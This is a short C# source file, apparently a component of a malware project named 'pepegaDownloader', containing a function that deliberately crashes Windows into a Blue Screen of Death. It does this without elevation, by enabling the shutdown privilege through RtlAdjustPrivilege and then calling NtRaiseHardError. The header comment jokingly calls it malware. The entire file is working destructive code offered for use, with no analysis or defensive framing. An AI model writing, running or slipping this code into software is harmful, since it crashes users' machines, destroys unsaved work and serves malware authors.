/* Bsod function, causes the famous Blue Screen of Death
 * ***WITHOUT*** elevation. which is kinda magical ngl,
 * windows based, malware wise lolololololololololololol.
 */

using System;
using System.Runtime.InteropServices;

namespace pepegaDownloader
{
    class bsod
    {
		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		public static void rip()
		{
			bool flag;
			bsod.RtlAdjustPrivilege(19, true, false, out flag);
			uint num;
			bsod.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
		}
    }
}
